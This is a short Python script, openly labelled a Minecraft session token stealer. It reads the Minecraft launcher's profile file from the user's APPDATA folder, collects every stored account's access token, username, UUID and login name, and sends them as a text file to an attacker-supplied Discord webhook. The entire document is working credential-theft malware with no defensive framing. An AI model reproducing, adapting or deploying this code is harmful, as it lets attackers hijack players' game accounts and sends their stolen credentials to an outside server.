# Minecraft Session Token Stealer
# Author: WodX
# Github: https://github.com/WodXTV
# Twitter: https://twitter.com/wodxsex

import discord_webhook
import json
import io
import os

# configuration
WEBHOOK_URL = '<URL HERE>'

def uuid_dashed(uuid):
    return f'{uuid[0:8]}-{uuid[8:12]}-{uuid[12:16]}-{uuid[16:21]}-{uuid[21:32]}'

def main():
    path = os.getenv('APPDATA') + '\\.minecraft\\launcher_profiles.json'

    json_data = json.loads(open(path).read())
    auth_db = json_data['authenticationDatabase']

    profiles = []
    for x in auth_db:
        session_token = auth_db[x]['accessToken']
        login_name = auth_db[x].get('username')
        uuid, display_name_object = list(auth_db[x]['profiles'].items())[0]

        profile = {
            'username': display_name_object['displayName'],
            'uuidv4': uuid,
            'uuidv4-dashed': uuid_dashed(uuid),
            'token': session_token,
            'login-name': login_name
        }

        profiles.append(profile)

    data = b''
    for i, profile in enumerate(profiles):
        for key, value in profile.items():
            if not value:
                continue

            data += f'{key}: {value}\n'.encode()

        if i < len(profiles) - 1:
            data += b'\n'
    
    webhook = discord_webhook.DiscordWebhook(WEBHOOK_URL, username='Minecraft Token Stealer by WodX', avatar_url='http://www.rw-designer.com/icon-image/5547-256x256x32.png')
    webhook.add_file(file=io.BytesIO(data), filename='dump.txt')
    webhook.execute()

if __name__ == '__main__':
    main()